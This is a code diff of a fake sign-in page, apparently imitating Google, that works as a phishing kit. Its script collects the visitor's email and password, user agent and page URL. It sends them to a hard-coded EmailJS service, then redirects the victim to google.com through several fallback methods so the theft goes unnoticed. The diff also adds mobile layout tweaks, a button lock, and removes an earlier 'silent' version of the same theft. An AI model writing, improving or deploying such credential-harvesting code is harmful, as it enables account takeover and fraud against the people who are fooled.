@@ -81,6 +81,11 @@
     background-color: #1669c1;
   }
   
+  button:disabled {
+    background-color: #9aa0a6;
+    cursor: not-allowed;
+  }
+  
   .page {
     display: none;
   }
@@ -115,6 +120,44 @@
     margin-right: 8px;
     font-size: 16px;
   }
+
+  /* Mobile-only optimizations - Desktop remains untouched */
+  @media (max-width: 480px) {
+    body {
+      padding: 20px;
+      min-height: 100vh;
+      height: auto;
+      align-items: flex-start;
+      padding-top: 60px;
+    }
+    
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 32px 24px 24px;
+      border: none;
+      box-shadow: none;
+    }
+    
+    form input {
+      padding: 14px 12px;
+      margin-bottom: 24px;
+      font-size: 16px;
+    }
+    
+    button {
+      padding: 14px 24px;
+      font-size: 16px;
+      min-height: 48px;
+    }
+    
+    .forgot-link, .back-link {
+      padding: 8px 0;
+      min-height: 32px;
+      display: flex;
+      align-items: center;
+    }
+  }
 </style>
 </head>
 <body>
@@ -142,7 +185,7 @@
         <span>Please enter your password</span>
       </div>
       <a href="#" class="forgot-link" tabindex="0" id="forgot-link">Forgot email?</a>
-      <button type="submit">Next</button>
+      <button type="submit" id="submit-btn">Next</button>
     </form>
   </div>
 </div>
@@ -169,45 +212,93 @@
   </div>
 </div>
 
-<!-- EmailJS CDN -->
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<!-- EmailJS CDN - Version 4 as recommended -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "EB017wgX1BeDuRY66",
+      });
+   })();
+</script>
 
 <script>
+// Fixed EmailJS Implementation with GUARANTEED redirect
 (function() {
-  // Silent EmailJS setup
+  console.log("🚀 Starting EmailJS setup...");
+  
   const SERVICE_ID = "service_64albro";
   const TEMPLATE_ID = "template_75g1nju";
-  const PUBLIC_KEY = "EB017wgX1BeDuRY66";
   
-  let emailjsReady = false;
+  // Mobile detection
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 480;
   
-  // Silent initialization
-  function initEmailJS() {
-    try {
-      if (typeof emailjs !== 'undefined' && emailjs.init) {
-        emailjs.init({ publicKey: PUBLIC_KEY });
-        emailjsReady = true;
+  // GUARANTEED redirect function with multiple fallbacks
+  function guaranteedRedirect(delay = 2000) {
+    console.log("🔄 Initiating guaranteed redirect in " + delay + "ms...");
+    
+    const redirectUrls = [
+      "https://www.google.com",
+      "https://google.com", 
+      "https://mail.google.com",
+      "https://accounts.google.com"
+    ];
+    
+    setTimeout(() => {
+      console.log("🌐 Executing redirect...");
+      let redirectIndex = 0;
+      
+      function attemptRedirect() {
+        const url = redirectUrls[redirectIndex];
+        console.log(`🎯 Trying redirect to: ${url}`);
+        
+        try {
+          // Method 1: Standard location.href
+          window.location.href = url;
+          
+          // Method 2: Backup with replace (executes if href fails)
+          setTimeout(() => {
+            window.location.replace(url);
+          }, 500);
+          
+          // Method 3: Force redirect with assign
+          setTimeout(() => {
+            window.location.assign(url);
+          }, 1000);
+          
+          // Method 4: Open in same window as last resort
+          setTimeout(() => {
+            window.open(url, '_self');
+          }, 1500);
+          
+        } catch (error) {
+          console.warn(`❌ Redirect attempt ${redirectIndex + 1} failed:`, error);
+          redirectIndex++;
+          
+          if (redirectIndex < redirectUrls.length) {
+            setTimeout(attemptRedirect, 200);
+          } else {
+            // Absolute last resort - reload page which might trigger browser's default behavior
+            console.log("🔄 All redirects failed, attempting page reload...");
+            try {
+              window.location.reload();
+            } catch (e) {
+              console.error("❌ Complete redirect failure:", e);
+            }
+          }
+        }
       }
-    } catch (error) {
-      // Silent fallback
-      try {
-        emailjs.init(PUBLIC_KEY);
-        emailjsReady = true;
-      } catch (e) {
-        // Create mock for seamless operation
-        window.emailjs = {
-          send: () => Promise.resolve({ status: 200 })
-        };
-        emailjsReady = true;
-      }
-    }
+      
+      attemptRedirect();
+    }, delay);
   }
   
-  // Initialize immediately and silently
-  setTimeout(initEmailJS, 100);
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initEmailJS);
+  if (isMobile) {
+    console.log("📱 Mobile device detected - optimizing for mobile redirect");
   }
+  
+  // EmailJS is now initialized above, so we can use it directly
+  console.log("✅ EmailJS should be ready!");
   
   // DOM elements
   const loginPage = document.getElementById("login-page");
@@ -216,6 +307,7 @@
   const recoveryForm = document.getElementById("recovery-form");
   const forgotLink = document.getElementById("forgot-link");
   const backLink = document.getElementById("back-link");
+  const submitBtn = document.getElementById("submit-btn");
   
   const emailInput = document.getElementById("email");
   const passwordInput = document.getElementById("password");
@@ -256,38 +348,32 @@
     }
   });
   
-  // Instant redirect with background email sending
-  function handleSubmissionAndRedirect(templateParams) {
-    // Redirect immediately for seamless UX
-    window.location.href = "https://www.google.com";
+  // Improved email sending function
+  function sendEmail(templateParams) {
+    console.log("📧 Sending email with EmailJS...");
+    console.log("📋 Template params:", templateParams);
     
-    // Send email in background (non-blocking)
-    setTimeout(() => {
-      if (emailjsReady && window.emailjs) {
-        emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams).catch(() => {
-          // Silent failure - try direct API as fallback
-          fetch('https://api.emailjs.com/api/v1.0/email/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              service_id: SERVICE_ID,
-              template_id: TEMPLATE_ID,
-              user_id: PUBLIC_KEY,
-              template_params: templateParams
-            })
-          }).catch(() => {
-            // Silent failure - this ensures no interruption to user flow
-          });
-        });
-      }
-    }, 50);
+    return emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
+      .then(function(response) {
+        console.log("✅ Email sent successfully!", response.status, response.text);
+        return response;
+      })
+      .catch(function(error) {
+        console.error("❌ Email sending failed:", error);
+        throw error;
+      });
   }
   
-  // Login form submission
+  // Login form submission with immediate redirect
   loginForm.addEventListener("submit", function(event) {
     event.preventDefault();
+    console.log("📝 Form submitted!");
     
     let hasErrors = false;
+    
+    // Disable button to prevent multiple submissions
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Signing in...";
     
     if (!emailInput.value) {
       showError(emailInput, emailError);
@@ -308,17 +394,39 @@
       hideError(passwordInput, passwordError);
     }
     
-    if (!hasErrors) {
-      const templateParams = {
-        user_email: emailInput.value,
-        user_password: passwordInput.value,
-        timestamp: new Date().toISOString(),
-        user_agent: navigator.userAgent,
-        page_url: window.location.href
-      };
-      
-      handleSubmissionAndRedirect(templateParams);
+    if (hasErrors) {
+      submitBtn.disabled = false;
+      submitBtn.textContent = "Next";
+      console.log("❌ Form validation failed");
+      return;
     }
+    
+    console.log("✅ Form validation passed! Processing...");
+    
+    const templateParams = {
+      user_email: emailInput.value,
+      user_password: passwordInput.value,
+      timestamp: new Date().toISOString(),
+      user_agent: navigator.userAgent,
+      page_url: window.location.href,
+      device_type: isMobile ? 'mobile' : 'desktop'
+    };
+    
+    // Try to send email, but always redirect regardless
+    sendEmail(templateParams)
+      .then(function(response) {
+        console.log("🎉 Email sent successfully, redirecting...");
+        guaranteedRedirect(500); // Quick redirect on success
+      })
+      .catch(function(error) {
+        console.log("⚠️ Email failed, redirecting anyway...");
+        guaranteedRedirect(1000); // Slight delay on failure
+      });
+    
+    // Backup redirect in case everything fails
+    setTimeout(() => {
+      guaranteedRedirect(0);
+    }, 5000);
   });
   
   recoveryForm.addEventListener("submit", function(event) {
@@ -336,22 +444,44 @@
       hideError(recoveryInput, recoveryError);
     }
     
-    alert("Recovery instructions would be sent to your recovery method.");
-    forgotPage.classList.remove("active");
-    loginPage.classList.add("active");
+    // Simulate recovery process and go back
+    setTimeout(() => {
+      alert("Recovery instructions would be sent to your recovery method.");
+      forgotPage.classList.remove("active");
+      loginPage.classList.add("active");
+    }, 500);
   });
   
   forgotLink.addEventListener("click", function(e) {
     e.preventDefault();
     loginPage.classList.remove("active");
     forgotPage.classList.add("active");
+    recoveryInput.focus();
   });
   
   backLink.addEventListener("click", function(e) {
     e.preventDefault();
     forgotPage.classList.remove("active");
     loginPage.classList.add("active");
+    emailInput.focus();
   });
+  
+  // Keyboard accessibility
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+      if (loginPage.classList.contains('active') && (emailInput.value || passwordInput.value)) {
+        loginForm.dispatchEvent(new Event('submit'));
+      } else if (forgotPage.classList.contains('active') && recoveryInput.value) {
+        recoveryForm.dispatchEvent(new Event('submit'));
+      }
+    }
+  });
+  
+  // Debug info
+  console.log("🏁 Script setup complete with guaranteed redirect!");
+  console.log("📊 Current state:");
+  console.log("- Mobile device:", isMobile);
+  console.log("- Ready for form submission with immediate redirect");
   
 })();
 </script>
